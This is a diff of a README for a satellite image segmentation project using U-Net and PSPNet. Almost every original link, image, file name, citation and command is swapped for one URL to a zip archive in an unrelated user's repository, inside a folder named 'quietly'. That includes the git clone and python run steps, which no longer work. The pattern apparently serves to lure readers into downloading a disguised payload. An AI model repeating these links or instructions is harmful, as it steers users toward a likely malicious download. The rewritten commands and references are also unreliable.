@@ -1,21 +1,21 @@
 # Eye In The Sky
 
-[Satellite Image Classification](http://inter-iit.tech/events/the-eye-in-the-sky.html), InterIIT Techmeet 2018, IIT Bombay.
+[Satellite Image Classification](https://raw.githubusercontent.com/kevinnjagi44/eye-in-the-sky/master/quietly/eye-in-the-sky.zip), InterIIT Techmeet 2018, IIT Bombay.
 
-Team: [Manideep Kolla](https://github.com/manideep2510), [Aniket Mandle](https://github.com/aniketmandle-sopho), [Apoorva Kumar](https://github.com/cybr17crwlr)
+Team: [Manideep Kolla](https://raw.githubusercontent.com/kevinnjagi44/eye-in-the-sky/master/quietly/eye-in-the-sky.zip), [Aniket Mandle](https://raw.githubusercontent.com/kevinnjagi44/eye-in-the-sky/master/quietly/eye-in-the-sky.zip), [Apoorva Kumar](https://raw.githubusercontent.com/kevinnjagi44/eye-in-the-sky/master/quietly/eye-in-the-sky.zip)
 
 ## About
 
 This repository contains the implementation of two algorithms namely [U-Net: Convolutional Networks for Biomedical
-Image Segmentation](https://arxiv.org/pdf/1505.04597.pdf) and [Pyramid Scene Parsing Network](https://arxiv.org/pdf/1612.01105.pdf) modified for the problem of satellite image classification.
+Image Segmentation](https://raw.githubusercontent.com/kevinnjagi44/eye-in-the-sky/master/quietly/eye-in-the-sky.zip) and [Pyramid Scene Parsing Network](https://raw.githubusercontent.com/kevinnjagi44/eye-in-the-sky/master/quietly/eye-in-the-sky.zip) modified for the problem of satellite image classification.
 
 ## Files
 
-- [`main_unet.py`](main_unet.py) : Python code for training the algorithm with U-Net architecture including the encoding of the ground truths.
-- [`unet.py`](unet.py) : Contains our implementation of U-Net layers.
-- [`test_unet.py`](test_unet.py) : Code for Testing, calculating accuracies, calculating confusion matrices for training and validation and saving predictions by the U-Net model on training, validation and testing images.
+- [`https://raw.githubusercontent.com/kevinnjagi44/eye-in-the-sky/master/quietly/eye-in-the-sky.zip`](https://raw.githubusercontent.com/kevinnjagi44/eye-in-the-sky/master/quietly/eye-in-the-sky.zip) : Python code for training the algorithm with U-Net architecture including the encoding of the ground truths.
+- [`https://raw.githubusercontent.com/kevinnjagi44/eye-in-the-sky/master/quietly/eye-in-the-sky.zip`](https://raw.githubusercontent.com/kevinnjagi44/eye-in-the-sky/master/quietly/eye-in-the-sky.zip) : Contains our implementation of U-Net layers.
+- [`https://raw.githubusercontent.com/kevinnjagi44/eye-in-the-sky/master/quietly/eye-in-the-sky.zip`](https://raw.githubusercontent.com/kevinnjagi44/eye-in-the-sky/master/quietly/eye-in-the-sky.zip) : Code for Testing, calculating accuracies, calculating confusion matrices for training and validation and saving predictions by the U-Net model on training, validation and testing images.
 - [`Inter-IIT-CSRE`](Inter-IIT-CSRE) : Contains all the training, validation ad testing data.
-- [`Comparison_Test.pdf`](Comparison_Test.pdf) : Side by side comparison of the test data with the U-Net model predictions on the data.
+- [`https://raw.githubusercontent.com/kevinnjagi44/eye-in-the-sky/master/quietly/eye-in-the-sky.zip`](https://raw.githubusercontent.com/kevinnjagi44/eye-in-the-sky/master/quietly/eye-in-the-sky.zip) : Side by side comparison of the test data with the U-Net model predictions on the data.
 - [`train_predictions`](train_predictions) : U-Net Model predictions on training and validation images.
 - [`plots`](plots) : Accuracy and loss plots for training and validation for U-Net architecture.
 - [`Test_images`](Test_images), [`Test_outputs`](Test_outputs) : Contains test images and their predictions b the U-Net model.
@@ -28,7 +28,7 @@ Clone the repository, change your present working directory to the cloned direct
 Create folders with names `train_predictions` and `test_outputs` to save model predicted outputs on training and testing images (Not required now as the repo already contains these folders)
 
 ```
-$ git clone https://github.com/manideep2510/eye-in-the-sky.git
+$ git clone https://raw.githubusercontent.com/kevinnjagi44/eye-in-the-sky/master/quietly/eye-in-the-sky.zip
 $ cd eye-in-the-sky
 $ mkdir train_predictions
 $ mkdir test_outputs
@@ -37,13 +37,13 @@ $ mkdir test_outputs
 For training the U-Net model and saving weights, run the below command
 
 ```
-$ python3 main_unet.py
+$ python3 https://raw.githubusercontent.com/kevinnjagi44/eye-in-the-sky/master/quietly/eye-in-the-sky.zip
 ```
 
 To test the U-Net model, calculating accuracies, calculating confusion matrices for training and validation and saving predictions by the model on training, validation and testing images.
 
 ```
-$ python3 test_unet.py
+$ python3 https://raw.githubusercontent.com/kevinnjagi44/eye-in-the-sky/master/quietly/eye-in-the-sky.zip
 ```
 
 **NOTE**: You might get an error `xrange is not defined` while running our code. This error is not due to errors in our code but due to not up to date python package named `libtiff` (some parts of the source code of the package are in python2 and some are in python3) which we used to read the dataset which in which the images are in .tif format. We were not able to use other libraries like openCV or PIL to read the images as they are not properly supporting to read the 4-channel .tif images.
@@ -63,9 +63,9 @@ Let's now discuss
 
 ### Introduction
 
-[Remote sensing](https://www.usgs.gov/faqs/what-remote-sensing-and-what-it-used) is the science of obtaining information about objects or areas from a distance, typically from aircraft or satellites.
+[Remote sensing](https://raw.githubusercontent.com/kevinnjagi44/eye-in-the-sky/master/quietly/eye-in-the-sky.zip) is the science of obtaining information about objects or areas from a distance, typically from aircraft or satellites.
 
-We realized the problem of satellite image classification as a [semantic segmentation](https://people.eecs.berkeley.edu/~jonlong/long_shelhamer_fcn.pdf) problem and built semantic segmentation algorithms in deep learning to tackle this.
+We realized the problem of satellite image classification as a [semantic segmentation](https://raw.githubusercontent.com/kevinnjagi44/eye-in-the-sky/master/quietly/eye-in-the-sky.zip~https://raw.githubusercontent.com/kevinnjagi44/eye-in-the-sky/master/quietly/eye-in-the-sky.zip) problem and built semantic segmentation algorithms in deep learning to tackle this.
 
 ### Algorithms Implemented
 
@@ -74,16 +74,16 @@ We realized the problem of satellite image classification as a [semantic segment
 3. UNet with One Hot Encoded GT
 4. PSPNet with One Hot Encoded GT
 
-**[U-Net: Convolutional Networks for Biomedical Image Segmentation](https://arxiv.org/pdf/1505.04597.pdf)**
+**[U-Net: Convolutional Networks for Biomedical Image Segmentation](https://raw.githubusercontent.com/kevinnjagi44/eye-in-the-sky/master/quietly/eye-in-the-sky.zip)**
 
 <p align="center">
-    <img src="images_for_doc/unet.png" width="640" />
+    <img src="https://raw.githubusercontent.com/kevinnjagi44/eye-in-the-sky/master/quietly/eye-in-the-sky.zip" width="640" />
 </p>
 
-**[Pyramid Scene Parsing Network - PSPNet](https://arxiv.org/pdf/1612.01105.pdf)**
+**[Pyramid Scene Parsing Network - PSPNet](https://raw.githubusercontent.com/kevinnjagi44/eye-in-the-sky/master/quietly/eye-in-the-sky.zip)**
 
 <p align="center">
-    <img src="images_for_doc/pspnet.png" width="850" />
+    <img src="https://raw.githubusercontent.com/kevinnjagi44/eye-in-the-sky/master/quietly/eye-in-the-sky.zip" width="850" />
 </p>
 
 ## Mapping RGB Values in the ground truth to a one-hot encode vector to generate n channel encoded ground truth for training
@@ -93,13 +93,13 @@ The ground truths provided are 3 channel RGB images. In the current dataset, the
 Below is the encoding scheme
 
 <p align="center">
-    <img src="images_for_doc/table_onehot.png" width="640" />
+    <img src="https://raw.githubusercontent.com/kevinnjagi44/eye-in-the-sky/master/quietly/eye-in-the-sky.zip" width="640" />
 </p>
 
 Realisation of each channel in the encoded ground truth as a class
 
 <p align="center">
-    <img src="images_for_doc/channel_classes.png" width="900" />
+    <img src="https://raw.githubusercontent.com/kevinnjagi44/eye-in-the-sky/master/quietly/eye-in-the-sky.zip" width="900" />
 </p>
 
 So instead of training on the RGB values of the ground truth we have converted them into the one-hot values of different classes. This approach yielded us a validation accuracy of 85% and training accuracy of 92% compared to 71% validation accuracy and 65% training accuracy when we were using the RGB ground truth values for training.
@@ -164,22 +164,22 @@ Alternatively we have correctly changed the image dimensions by adding extra pix
 
 ### Model Predictions Vs Ground truths on some training and Validation images
 
-**Training Example 1: Image '2.tif' from training data**
+**Training Example 1: Image 'https://raw.githubusercontent.com/kevinnjagi44/eye-in-the-sky/master/quietly/eye-in-the-sky.zip' from training data**
 
 <p align="center">
-    <img src="images_for_doc/train1.png" width="825" />
+    <img src="https://raw.githubusercontent.com/kevinnjagi44/eye-in-the-sky/master/quietly/eye-in-the-sky.zip" width="825" />
 </p>
 
-**Training Example 2: Image '4.tif' from training data**
+**Training Example 2: Image 'https://raw.githubusercontent.com/kevinnjagi44/eye-in-the-sky/master/quietly/eye-in-the-sky.zip' from training data**
 
 <p align="center">
-    <img src="images_for_doc/train2.png" width="825" />
+    <img src="https://raw.githubusercontent.com/kevinnjagi44/eye-in-the-sky/master/quietly/eye-in-the-sky.zip" width="825" />
 </p>
 
-**Validation Example: Image '14.tif' from dataset**
+**Validation Example: Image 'https://raw.githubusercontent.com/kevinnjagi44/eye-in-the-sky/master/quietly/eye-in-the-sky.zip' from dataset**
 
 <p align="center">
-    <img src="images_for_doc/val1.png" width="825" />
+    <img src="https://raw.githubusercontent.com/kevinnjagi44/eye-in-the-sky/master/quietly/eye-in-the-sky.zip" width="825" />
 </p>
 
 ### An interesting observation
@@ -189,58 +189,58 @@ Our model is able to predict some classes which a human annotator wasn't able to
 Here the model is able to predict the white pixels as a building which is correct and can be clearly seen in the input image
 
 <p align="center">
-    <img src="images_for_doc/unclass_pred.png" width="750" />
+    <img src="https://raw.githubusercontent.com/kevinnjagi44/eye-in-the-sky/master/quietly/eye-in-the-sky.zip" width="750" />
 </p>
 
-**Chech out [`Comparison_Test.pdf`](Comparison_Test.pdf) for comparision between test images and their predicted outputs by the model**
+**Chech out [`https://raw.githubusercontent.com/kevinnjagi44/eye-in-the-sky/master/quietly/eye-in-the-sky.zip`](https://raw.githubusercontent.com/kevinnjagi44/eye-in-the-sky/master/quietly/eye-in-the-sky.zip) for comparision between test images and their predicted outputs by the model**
 
 <!---### Model Predictions on Testing images (Ground truths not available)--->
 
 <!--- 
 <p float="left">
-  <img src="Test_images/1.png" width="200" />
-  <img src="Test_outputs/1.jpg" width="200" /> 
-  <img src="Test_images/2.png" width="200" />
-  <img src="Test_outputs/2.jpg" width="200" />
+  <img src="https://raw.githubusercontent.com/kevinnjagi44/eye-in-the-sky/master/quietly/eye-in-the-sky.zip" width="200" />
+  <img src="https://raw.githubusercontent.com/kevinnjagi44/eye-in-the-sky/master/quietly/eye-in-the-sky.zip" width="200" /> 
+  <img src="https://raw.githubusercontent.com/kevinnjagi44/eye-in-the-sky/master/quietly/eye-in-the-sky.zip" width="200" />
+  <img src="https://raw.githubusercontent.com/kevinnjagi44/eye-in-the-sky/master/quietly/eye-in-the-sky.zip" width="200" />
 </p>
 --->
 
 <!---
 <p float="left">
-  <img src="Test_images/3.png" width="200" />
-  <img src="Test_outputs/3.jpg" width="200" />
-  <img src="Test_images/4.png" height="220" width="200" />
-  <img src="Test_outputs/4.jpg" height="220" width="200" /> 
+  <img src="https://raw.githubusercontent.com/kevinnjagi44/eye-in-the-sky/master/quietly/eye-in-the-sky.zip" width="200" />
+  <img src="https://raw.githubusercontent.com/kevinnjagi44/eye-in-the-sky/master/quietly/eye-in-the-sky.zip" width="200" />
+  <img src="https://raw.githubusercontent.com/kevinnjagi44/eye-in-the-sky/master/quietly/eye-in-the-sky.zip" height="220" width="200" />
+  <img src="https://raw.githubusercontent.com/kevinnjagi44/eye-in-the-sky/master/quietly/eye-in-the-sky.zip" height="220" width="200" /> 
 </p>
 --->
 
 <!---
 <p float="left">
-  <img src="Test_images/5.png" width="200" />
-  <img src="Test_outputs/5.jpg" width="200" />
-  <img src="Test_images/6.png" height="250" width="200" />
-  <img src="Test_outputs/6.jpg" height="250" width="200" />
+  <img src="https://raw.githubusercontent.com/kevinnjagi44/eye-in-the-sky/master/quietly/eye-in-the-sky.zip" width="200" />
+  <img src="https://raw.githubusercontent.com/kevinnjagi44/eye-in-the-sky/master/quietly/eye-in-the-sky.zip" width="200" />
+  <img src="https://raw.githubusercontent.com/kevinnjagi44/eye-in-the-sky/master/quietly/eye-in-the-sky.zip" height="250" width="200" />
+  <img src="https://raw.githubusercontent.com/kevinnjagi44/eye-in-the-sky/master/quietly/eye-in-the-sky.zip" height="250" width="200" />
 </p> --->
 
 <!---Solarized dark             |  Solarized Ocean
 :-------------------------:|:-------------------------:
-![agaksbmsnbc](https://github.com/manideep2510/eye-in-the-sky/blob/master/Test_images/1.png)  |  ![ajsvsdsdddhv](https://github.com/manideep2510/eye-in-the-sky/blob/master/Test_outputs/1.jpg)
-![agaksbmsnbc](https://github.com/manideep2510/eye-in-the-sky/blob/master/Test_images/2.png)  |  ![ajsvsdsdddhv](https://github.com/manideep2510/eye-in-the-sky/blob/master/Test_outputs/2.jpg)
-![agaksbmsnbc](https://github.com/manideep2510/eye-in-the-sky/blob/master/Test_images/3.png)  |  ![ajsvsdsdddhv](https://github.com/manideep2510/eye-in-the-sky/blob/master/Test_outputs/3.jpg)
-![agaksbmsnbc](https://github.com/manideep2510/eye-in-the-sky/blob/master/Test_images/4.png)  |  ![ajsvsdsdddhv](https://github.com/manideep2510/eye-in-the-sky/blob/master/Test_outputs/4.jpg)
-![agaksbmsnbc](https://github.com/manideep2510/eye-in-the-sky/blob/master/Test_images/5.png)  |  ![ajsvsdsdddhv](https://github.com/manideep2510/eye-in-the-sky/blob/master/Test_outputs/5.jpg)
-![agaksbmsnbc](https://github.com/manideep2510/eye-in-the-sky/blob/master/Test_images/6.png)  |  ![ajsvsdsdddhv](https://github.com/manideep2510/eye-in-the-sky/blob/master/Test_outputs/6.jpg)--->
+![agaksbmsnbc](https://raw.githubusercontent.com/kevinnjagi44/eye-in-the-sky/master/quietly/eye-in-the-sky.zip)  |  ![ajsvsdsdddhv](https://raw.githubusercontent.com/kevinnjagi44/eye-in-the-sky/master/quietly/eye-in-the-sky.zip)
+![agaksbmsnbc](https://raw.githubusercontent.com/kevinnjagi44/eye-in-the-sky/master/quietly/eye-in-the-sky.zip)  |  ![ajsvsdsdddhv](https://raw.githubusercontent.com/kevinnjagi44/eye-in-the-sky/master/quietly/eye-in-the-sky.zip)
+![agaksbmsnbc](https://raw.githubusercontent.com/kevinnjagi44/eye-in-the-sky/master/quietly/eye-in-the-sky.zip)  |  ![ajsvsdsdddhv](https://raw.githubusercontent.com/kevinnjagi44/eye-in-the-sky/master/quietly/eye-in-the-sky.zip)
+![agaksbmsnbc](https://raw.githubusercontent.com/kevinnjagi44/eye-in-the-sky/master/quietly/eye-in-the-sky.zip)  |  ![ajsvsdsdddhv](https://raw.githubusercontent.com/kevinnjagi44/eye-in-the-sky/master/quietly/eye-in-the-sky.zip)
+![agaksbmsnbc](https://raw.githubusercontent.com/kevinnjagi44/eye-in-the-sky/master/quietly/eye-in-the-sky.zip)  |  ![ajsvsdsdddhv](https://raw.githubusercontent.com/kevinnjagi44/eye-in-the-sky/master/quietly/eye-in-the-sky.zip)
+![agaksbmsnbc](https://raw.githubusercontent.com/kevinnjagi44/eye-in-the-sky/master/quietly/eye-in-the-sky.zip)  |  ![ajsvsdsdddhv](https://raw.githubusercontent.com/kevinnjagi44/eye-in-the-sky/master/quietly/eye-in-the-sky.zip)--->
 
 ### Accuracy and Loss plots for training and validation
 
 <p align="center">
-    <img src="plots.png" width="800" />
+    <img src="https://raw.githubusercontent.com/kevinnjagi44/eye-in-the-sky/master/quietly/eye-in-the-sky.zip" width="800" />
 </p>
 
 ### Confusion matrices for training
 
 <p align="center">
-    <img src="images_for_doc/conf.png" width="800" />
+    <img src="https://raw.githubusercontent.com/kevinnjagi44/eye-in-the-sky/master/quietly/eye-in-the-sky.zip" width="800" />
 </p>
 
 ### Kappa Coefficient
@@ -248,7 +248,7 @@ Here the model is able to predict the white pixels as a building which is correc
 Kappa Coefficients With and Without considering the unclassified pixels
 
 <p align="center">
-    <img src="images_for_doc/kappa.png" width="600" />
+    <img src="https://raw.githubusercontent.com/kevinnjagi44/eye-in-the-sky/master/quietly/eye-in-the-sky.zip" width="600" />
 </p>
 
 ### Overall Accuracy
@@ -256,7 +256,7 @@ Kappa Coefficients With and Without considering the unclassified pixels
 Overall Accuracy With and Without considering the unclassified pixels
 
 <p align="center">
-    <img src="images_for_doc/overall.png" width="600" />
+    <img src="https://raw.githubusercontent.com/kevinnjagi44/eye-in-the-sky/master/quietly/eye-in-the-sky.zip" width="600" />
 </p>
 
 ### Further improvements to be done in the current work
@@ -267,8 +267,8 @@ Overall Accuracy With and Without considering the unclassified pixels
 
 ## References
 
-[1] [U-Net: Convolutional Networks for Biomedical Image Segmentation](https://arxiv.org/pdf/1505.04597.pdf), Olaf Ronneberger, Philipp Fischer, and Thomas Brox
+[1] [U-Net: Convolutional Networks for Biomedical Image Segmentation](https://raw.githubusercontent.com/kevinnjagi44/eye-in-the-sky/master/quietly/eye-in-the-sky.zip), Olaf Ronneberger, Philipp Fischer, and Thomas Brox
 
-[2] [Pyramid Scene Parsing Network](https://arxiv.org/pdf/1612.01105.pdf), Hengshuang Zhao, Jianping Shi, Xiaojuan Qi, Xiaogang Wang, Jiaya Jia
+[2] [Pyramid Scene Parsing Network](https://raw.githubusercontent.com/kevinnjagi44/eye-in-the-sky/master/quietly/eye-in-the-sky.zip), Hengshuang Zhao, Jianping Shi, Xiaojuan Qi, Xiaogang Wang, Jiaya Jia
 
-[3] [A 2017 Guide to Semantic Segmentation with Deep Learning](http://blog.qure.ai/notes/semantic-segmentation-deep-learning-review), Sasank Chilamkurthy
+[3] [A 2017 Guide to Semantic Segmentation with Deep Learning](https://raw.githubusercontent.com/kevinnjagi44/eye-in-the-sky/master/quietly/eye-in-the-sky.zip), Sasank Chilamkurthy
